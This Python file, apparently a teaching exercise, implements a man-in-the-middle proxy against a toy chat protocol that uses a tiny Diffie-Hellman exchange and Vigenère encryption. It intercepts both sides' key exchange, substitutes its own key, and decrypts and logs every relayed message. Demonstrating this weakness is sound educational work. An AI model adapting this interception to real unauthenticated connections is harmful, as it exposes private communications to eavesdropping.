import socket
import threading
import random
import tkinter as tk
from tkinter import scrolledtext, simpledialog, Frame, LEFT
from crypto import vigenere_encrypt, vigenere_decrypt, normalize_key

P = 23
G = 5

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 12345
MITM_PORT = 5555  # The fake server listens on this port

def diffie_hellman_private():
    return random.randint(2, P - 2)

def diffie_hellman_shared(private_key, public_key):
    return (public_key ** private_key) % P

class MITMProxy:
    def __init__(self):
        self.clients = {}  # Maps client name -> (client_socket, server_socket, client_key, server_key)
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind(("0.0.0.0", MITM_PORT))
        self.server_socket.listen(5)

        # Tkinter GUI
        self.root = tk.Tk()
        self.root.title("MITM Proxy")

        self.text_area = scrolledtext.ScrolledText(self.root, wrap=tk.WORD)
        self.text_area.pack()

        buttons = Frame(self.root)
        buttons.pack()

        self.users_button = tk.Button(buttons, text="Liste des clients", command=self.list_clients)
        self.users_button.pack(side=LEFT)

        self.kick_button = tk.Button(buttons, text="Déconnecter un client", command=self.kick_client)
        self.kick_button.pack(side=LEFT)

    def log(self, message):
        self.text_area.insert(tk.END, f"{message}\n")
        self.text_area.see(tk.END)

    def handle_client(self, client_socket):
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((SERVER_HOST, SERVER_PORT))

            self.log("[*] Client connecté. Interception de l'échange Diffie-Hellman...")

            # Diffie-Hellman Key Exchange
            server_socket.recv(1024)  # Receive P
            server_socket.recv(1024)  # Receive G
            client_socket.send(str(P).encode())
            client_socket.send(str(G).encode())

            client_public_key = int(client_socket.recv(1024).decode())
            self.log(f"[MITM] Clé publique client interceptée: {client_public_key}")

            private_mitm_client = diffie_hellman_private()
            fake_client_public_key = (G ** private_mitm_client) % P
            client_socket.send(str(fake_client_public_key).encode())

            server_socket.send(str(fake_client_public_key).encode())
            server_public_key = int(server_socket.recv(1024).decode())

            self.log(f"[MITM] Clé publique serveur interceptée: {server_public_key}")

            shared_key_client = diffie_hellman_shared(private_mitm_client, client_public_key)
            shared_key_server = diffie_hellman_shared(private_mitm_client, server_public_key)

            key_str_client = normalize_key(shared_key_client)
            key_str_server = normalize_key(shared_key_server)

            self.log(f"[MITM] Clé partagée avec Client: {key_str_client}")
            self.log(f"[MITM] Clé partagée avec Serveur: {key_str_server}")

            client_name = client_socket.recv(1024).decode().strip()
            server_socket.send(client_name.encode())

            self.clients[client_name] = (client_socket, server_socket, key_str_client, key_str_server)

            threading.Thread(target=self.relay_messages, args=(client_name, client_socket, server_socket, key_str_client, key_str_server), daemon=True).start()
            threading.Thread(target=self.relay_messages, args=(client_name, server_socket, client_socket, key_str_server, key_str_client), daemon=True).start()

        except Exception as e:
            self.log(f"[MITM] Erreur lors de la connexion client: {e}")

    def relay_messages(self, client_name, source, destination, decrypt_key, encrypt_key):
        try:
            while True:
                encrypted_data = source.recv(1024).decode()
                if not encrypted_data:
                    break

                decrypted_message = vigenere_decrypt(encrypted_data, decrypt_key)
                self.log(f"[MITM] {client_name} -> {decrypted_message}")

                re_encrypted_message = vigenere_encrypt(decrypted_message, encrypt_key)
                destination.send(re_encrypted_message.encode())

        except (ConnectionResetError, ConnectionAbortedError):
            self.log(f"[MITM] Connexion avec {client_name} interrompue.")
        finally:
            self.disconnect_client(client_name)

    def list_clients(self):
        if not self.clients:
            self.log("[MITM] Aucun client connecté.")
        else:
            self.log(f"[MITM] Clients connectés: {', '.join(self.clients.keys())}")

    def kick_client(self):
        target = simpledialog.askstring("Déconnecter", "Nom du client à déconnecter :", parent=self.root)
        if target in self.clients:
            self.disconnect_client(target)
            self.log(f"[MITM] Client {target} déconnecté.")
        else:
            self.log(f"[MITM] Client {target} introuvable.")

    def disconnect_client(self, client_name):
        if client_name in self.clients:
            client_socket, server_socket, _, _ = self.clients[client_name]
            try:
                client_socket.close()
                server_socket.close()
            except Exception as e:
                self.log(f"[MITM] Erreur lors de la fermeture des sockets de {client_name}: {e}")
            finally:
                self.clients.pop(client_name, None)

    def start(self):
        self.log(f"[*] MITM écoutant sur le port {MITM_PORT}...")
        threading.Thread(target=self.accept_connections, daemon=True).start()
        self.root.mainloop()

    def accept_connections(self):
        while True:
            try:
                client_socket, _ = self.server_socket.accept()
                threading.Thread(target=self.handle_client, args=(client_socket,), daemon=True).start()
            except Exception as e:
                self.log(f"[MITM] Erreur d'acceptation: {e}")

if __name__ == "__main__":
    mitm = MITMProxy()
    mitm.start()
